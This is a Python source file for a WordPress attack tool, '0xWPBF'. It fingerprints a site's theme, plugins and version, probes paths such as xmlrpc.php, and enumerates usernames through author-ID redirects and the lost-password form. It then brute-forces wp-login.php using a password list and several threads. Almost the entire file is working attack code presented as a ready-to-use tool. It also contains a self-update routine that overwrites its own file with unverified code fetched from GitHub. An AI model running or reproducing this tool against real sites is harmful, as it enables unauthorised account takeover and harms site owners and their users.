#!/usr/bin/python
# coding: utf-8

from __future__ import print_function
import itertools
import threading
import time
import sys, os, re, argparse

try:
    from prettytable import PrettyTable
except:
    sys.exit('[\033[1;33m--\033[1;m] You Need to install PrettyTable: sudo pip install PrettyTable')
try:
    import mechanicalsoup
except:
    sys.exit('[\033[1;33m--\033[1;m] You Need to install mechanicalsoup: sudo pip install mechanicalsoup')


print('''
    \033[1;33m█▀▀█ █░█  █░░░█    █▀▀█     █▀▀▄     █▀▀\033[1;m
    \033[1;31m█▄▀█ ▄▀▄  █▄█▄█ord █░░█ress █▀▀▄RUTE █▀▀ORCER\033[1;m
    \033[1;33m█▄▄█ ▀░▀  ░▀░▀░    █▀▀▀     ▀▀▀░     ▀░░ v1.3
    Coded By Abdullah AlZahrani | Website: www.0xa.tech
    Twitter: @0xAbdullah | GitHub.com/0xAbdullah\033[1;m
    ''')

parser = argparse.ArgumentParser(description="\033[1;33m[--]\033[1;m Wordpress users enumerate and brute force attack")
parser.add_argument('-s', required=False, default=None, help='Target Website.')
parser.add_argument('-p', required=False, default=None, help='Password list / Path of password file.')
parser.add_argument('-u', required=False, default=None, help='Target username.')
parser.add_argument('-e', required=False, default=None, help='Guess usernames / Path of usernames file.')
parser.add_argument('-t', required=False, default=None, help='Number of threads.')
parser.add_argument('-info', required=False, default=None, help='Information about your target.')

args = vars(parser.parse_args())

if len(sys.argv) == 1:
    print("[\033[1;33m--\033[1;m] Usage: python 0xwpbf.py -h")
    sys.exit()

host = args['s']
if not host.startswith("http"):
    sys.exit("[\033[1;33m--\033[1;m] Wrong Site format (ex): http://{}".format(host))

browser = mechanicalsoup.StatefulBrowser(
    soup_config={'features': 'lxml'},
    raise_on_404=True,
    user_agent='Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.2228.0 Safari/537.36', )

if args['t'] is not None:
    numThreads = int(args['t'])
    if numThreads > 10:
        sys.exit('[\033[1;41m--\033[1;m] Maximum number of threads 10')
else:
    numThreads = int(1)

def checkUpdate(): # Thanks xSecurity for your help | Follow him on Twitter: @xSecLabs
    xWPBF = os.path.basename(__file__)
    check = browser.open('https://raw.githubusercontent.com/0xAbdullah/0xWPBF/master/version').text

    if '0xWPBF v1.3' not in check:
        print('[$] There New Update | Wait...')
        newUpdate = browser.open('https://raw.githubusercontent.com/0xAbdullah/0xWPBF/master/0xWPBF.py').text
        update = file(xWPBF, 'w')
        update.write(newUpdate)
        sys.exit('[==] Update Complete, Now Try To Execute Tool Again..')

def info():

    print("[\033[1;33m-\033[1;m] Information about your target")
    browser.open(host)
    page = browser.get_current_page()
    tableInfo = PrettyTable(['\033[1;33mInfo\033[1;m', '\033[1;32mResult\033[1;m'])
    tablePath = PrettyTable(['\033[1;33mPath\033[1;m', '\033[1;32mStatus\033[1;m'])

    domain = host
    if domain.startswith('http://'):
        domain = re.sub("http://", "", domain)
    elif domain.startswith('https://'):
        domain = re.sub("https://", "", domain)

    title = page.title.text.encode('utf-8')

    if '|' in title:
        title = title.split('|', 1)[0]
    elif '–' in title:
        title = title.split('–', 1)[0]
    elif '-' in title:
        title = title.split('-', 1)[0]

    tableInfo.add_row(['Website', domain])
    tableInfo.add_row(['Title', title])

    for checkTheme in page.find_all("link", rel="stylesheet", href=True):
        checkVersion = checkTheme['href']

        if '/wp-content/themes/' in checkVersion:
            themeName = checkVersion.rsplit('/', -3)[5]
            themeVersion = checkVersion.rsplit('/', 2)[-1]
            themeVersion = re.search('([0-9]+\.[0-9]+\.?[0-9]*)', (str(themeVersion)))
            tableInfo.add_row(['Theme Name', themeName])
            try:
                tableInfo.add_row(['Theme Version', themeVersion.group(0)])
            except:
                tableInfo.add_row(['Theme Version', 'None'])
            break

    try:
        checkVersion = page
        checkVersion = re.search('WordPress ([0-9]+\.[0-9]+\.?[0-9]*)', (str(checkVersion)))
        checkVersion = checkVersion.group(0)
        checkVersion = re.sub("WordPress ", "", checkVersion)
        tableInfo.add_row(['Wordpress Version', checkVersion])

    except:
        tableInfo.add_row(['Wordpress Version', "None"])

    print(tableInfo)


    print("\n[\033[1;33m-\033[1;m] Scanning for Files and Directories")
    Path = ["/robots.txt", "/license.txt", "/readme.html", "/xmlrpc.php", "/wp-includes", "/wp-content/uploads"]
    for Path in Path:

        try:
            checkPath = browser.open(host + Path).status_code
            tablePath.add_row([host+Path, checkPath])

        except mechanicalsoup.utils.LinkNotFoundError:
            tablePath.add_row([host + Path, '404'])

    print(tablePath)

    print("\n[\033[1;33m-\033[1;m] Scanning for Plugins")
    tablePlugins = PrettyTable(['\033[1;33mPlugin Name\033[1;m', '\033[1;32mPlugin Version\033[1;m'])
    pluginsList = []
    found = False

    for checkPlugins in page.find_all("link", rel="stylesheet", href=True):
        checkPlugins = checkPlugins['href']

        if '/wp-content/plugins/' in checkPlugins:

            try:
                pluginsName = checkPlugins.rsplit('/', -3)[5]
                pluginsVersion = checkPlugins.rsplit('/', 2)[-1]
                pluginsVersion = re.search('([0-9]+\.[0-9]+\.?[0-9]*)', (str(pluginsVersion)))

                if pluginsName not in pluginsList:
                    found = True
                    pluginsList.append(pluginsName)
                    tablePlugins.add_row([pluginsName, pluginsVersion.group(0)])
            except:
                pass

    if found:
        print(tablePlugins)
    else:
        print("[\033[1;41m--\033[1;m] No Plugins Found!")

def _bruteForce():

    global dead
    dead = False
    print('\r[\033[1;33m--\033[1;m] To stop press Ctrl+Z')
    print('\r[\033[1;33m--\033[1;m] Number of thread/s: {}'.format(numThreads))

    def animate():  # animation function

        for c in itertools.cycle(['|', '/', '-', '\\']):
            if dead:
                print('\r[\033[1;33m--\033[1;m] Done !                                ')
                sys.exit(0)

            sys.stdout.write('\r[\033[1;33m--\033[1;m] Starting the password Brute Forcer [{}]                 '.format(c))
            sys.stdout.flush()
            time.sleep(0.1)
        sys.exit(0)

    if os.path.exists(args['p']) == False:
        print("[\033[1;41m--\033[1;m] Password File Path Does Not exist !")
        sys.exit()

    pwdFile = open(args['p'], 'r')
    numPassword = sum(1 for line in open(args['p']))
    global loginTry
    loginTry = 0

    def bruteForce():  # thread Brute Force function

        for password in pwdFile:
            global loginTry

            time.sleep(1.5)
            try:
                browser.open(host + '/wp-login.php')
                browser.select_form('#loginform')
                browser["log"] = args['u']
                browser["pwd"] = password
                browser.submit_selected()
                page = browser.get_current_page()
                loginTry += 1
                wpLogin = page.find("span", class_="display-name")

                if wpLogin:
                    print("\n[\033[1;32m--\033[1;m] Password Found"
                          "\n[\033[1;32m--\033[1;m] WP-login: {}/wp-admin"
                          "\n[\033[1;32m--\033[1;m] Username: {}"
                          "\n[\033[1;32m--\033[1;m] Password: {}"
                          .format(host, args['u'], password))
                    global dead
                    dead = True
                    threadBruteForce.daemon = True
                    loading.daemon = True
                    sys.exit(0)

            except mechanicalsoup.utils.LinkNotFoundError:
                sys.stdout.flush()
                sys.stdout.write('\r[\033[1;33m--\033[1;m] website may be down Or you have been banned!          ')

            except RuntimeError:
                pass

            if loginTry == numPassword:
                try:
                    print('\n[\033[1;41m--\033[1;m] Password Not Found!')
                    dead = True
                    threadBruteForce.daemon = True
                    loading.daemon = True
                    sys.exit(0)
                except RuntimeError:
                    pass

    loading = threading.Thread(target=animate)
    loading.setDaemon(False)
    loading.start()

    threads = []
    for i in range(numThreads+1):
        threadBruteForce = threading.Thread(target=bruteForce)
        threads.append(threadBruteForce)
        threadBruteForce.setDaemon(True)
        threadBruteForce.start()


def autoEnumeration():
    checkUser = (host + "/?author=")
    found = False
    ID = 0
    print("\n[\033[1;33m-\033[1;m] Scanning for active username/s automatically!")
    usernameList = []
    tbleUsername = PrettyTable(['\033[1;33mID\033[1;m', '\033[1;32mUsername\033[1;m'])
    for i in checkUser:
        try:
            ID += 1
            check = (checkUser + str(ID))
            res = browser.open(check)
            user = res.url.rsplit('/', 0)[-1]
            user = user.rsplit('/', 1)
            user = ''.join(user)
            user = user.rsplit('/', 1)[1]
            if "author" in user:
                if found:
                    break
                print("[\033[1;41m--\033[1;m] There is a problem, the URL can not be traced")
                break

            found = True
            if user in usernameList:
                break
            usernameList.append(user)
            tbleUsername.add_row([ID, user])
        except mechanicalsoup.utils.LinkNotFoundError:
            if found == 1:
                break
            else:
                print("[\033[1;41m--\033[1;m] There may be a firewall does not allow to extract username/s!")
                break
        except KeyboardInterrupt:
            sys.exit('[--] EXIT...')
    if found:
        print(tbleUsername)

def manualEnumeration():
    if os.path.exists(args['e']) == False:

        print("[\033[1;41m--\033[1;m] Usernames File Path Does Not exist !")
        sys.exit()

    userFile = open(args['e'], "r")
    found = False
    print("[\033[1;33m--\033[1;m] Searching for username/s!")
    tbleUsername = PrettyTable(['\033[1;33mID\033[1;m', '\033[1;32mUsername\033[1;m'])
    ID = 0

    for user in userFile:
        user = user.split()

        try:
            browser.open(host + "/wp-login.php?action=lostpassword")
            browser.select_form('#lostpasswordform')
            browser["user_login"] = user
            browser.submit_selected()
            page = browser.get_current_page()
            lostPassword = page.find("div", id="login_error")

            if lostPassword:
                pass
            else:
                ID += 1
                tbleUsername.add_row([ID, user[0]])
                found = True

        except KeyboardInterrupt:
            sys.exit('[--] EXIT...')

        except:
            print("[\033[1;41m--\033[1;m] There may be a firewall does not allow to extract username/s!")
            sys.exit()

    if found == False:
        print("[\033[1;41m--\033[1;m] Not found usernames!")
    else:
        print(tbleUsername)

def main():
    if args['s'] is not None and args['e'] is not None:
        manualEnumeration()
    elif args['s'] is not None and args['u'] is not None and args['p'] is not None:
        _bruteForce()
    elif args['s'] is not None and args['info'] is None:
        info()
        autoEnumeration()
    else:
        print("\033[1;33m[!]\033[1;m Input is not correct, check them out! Or typing python 0xwpbf.py -h")

if __name__ == '__main__':
    checkUpdate()
    main()
